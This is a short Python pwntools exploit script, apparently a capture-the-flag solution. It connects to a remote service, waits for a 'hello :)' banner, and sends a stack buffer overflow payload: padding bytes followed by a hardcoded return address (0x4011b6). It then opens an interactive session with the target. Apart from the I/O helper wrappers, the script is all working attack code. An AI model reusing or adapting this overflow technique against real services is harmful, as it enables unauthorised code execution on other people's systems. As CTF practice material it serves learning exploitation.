from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'


if len(sys.argv) > 1:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "localhost"
    port = 3001


log = False
is_gaibu = True

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b'>'):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)

recvuntil(b"hello :)")
wait_for_attach()
s = b"0"
s += b"\x00" * (8 * 5 - 1)
s += p64(0x4011b6)
sendline(s)

interactive()
